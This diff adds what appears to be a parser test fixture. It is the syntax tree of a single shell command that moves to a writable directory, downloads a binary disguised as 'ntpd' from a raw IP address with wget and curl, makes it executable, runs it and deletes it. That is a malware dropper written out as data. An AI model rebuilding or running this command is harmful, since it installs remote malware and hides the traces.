@@ -1,0 +1,53 @@
+ListNode(lineno=2, pos=(12, 172), parts=[
+  CommandNode(lineno=2, pos=(12, 19), parts=[
+    WordNode(lineno=2, pos=(12, 14), word='cd'),
+    WordNode(lineno=2, pos=(15, 19), word='/tmp'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(20, 22)),
+  CommandNode(lineno=2, pos=(23, 34), parts=[
+    WordNode(lineno=2, pos=(23, 25), word='cd'),
+    WordNode(lineno=2, pos=(26, 34), word='/var/run'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(35, 37)),
+  CommandNode(lineno=2, pos=(38, 45), parts=[
+    WordNode(lineno=2, pos=(38, 40), word='cd'),
+    WordNode(lineno=2, pos=(41, 45), word='/mnt'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(46, 48)),
+  CommandNode(lineno=2, pos=(49, 57), parts=[
+    WordNode(lineno=2, pos=(49, 51), word='cd'),
+    WordNode(lineno=2, pos=(52, 57), word='/root'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(58, 60)),
+  CommandNode(lineno=2, pos=(61, 65), parts=[
+    WordNode(lineno=2, pos=(61, 63), word='cd'),
+    WordNode(lineno=2, pos=(64, 65), word='/'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(65, 66)),
+  CommandNode(lineno=2, pos=(67, 99), parts=[
+    WordNode(lineno=2, pos=(67, 71), word='wget'),
+    WordNode(lineno=2, pos=(72, 99), word='http://165.227.106.171/ntpd'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(99, 100)),
+  CommandNode(lineno=2, pos=(101, 136), parts=[
+    WordNode(lineno=2, pos=(101, 105), word='curl'),
+    WordNode(lineno=2, pos=(106, 108), word='-O'),
+    WordNode(lineno=2, pos=(109, 136), word='http://165.227.106.171/ntpd'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(136, 137)),
+  CommandNode(lineno=2, pos=(138, 151), parts=[
+    WordNode(lineno=2, pos=(138, 143), word='chmod'),
+    WordNode(lineno=2, pos=(144, 146), word='+x'),
+    WordNode(lineno=2, pos=(147, 151), word='ntpd'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(151, 152)),
+  CommandNode(lineno=2, pos=(153, 159), parts=[
+    WordNode(lineno=2, pos=(153, 159), word='./ntpd'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(159, 160)),
+  CommandNode(lineno=2, pos=(161, 172), parts=[
+    WordNode(lineno=2, pos=(161, 163), word='rm'),
+    WordNode(lineno=2, pos=(164, 167), word='-rf'),
+    WordNode(lineno=2, pos=(168, 172), word='ntpd'),
+  ]),
+])
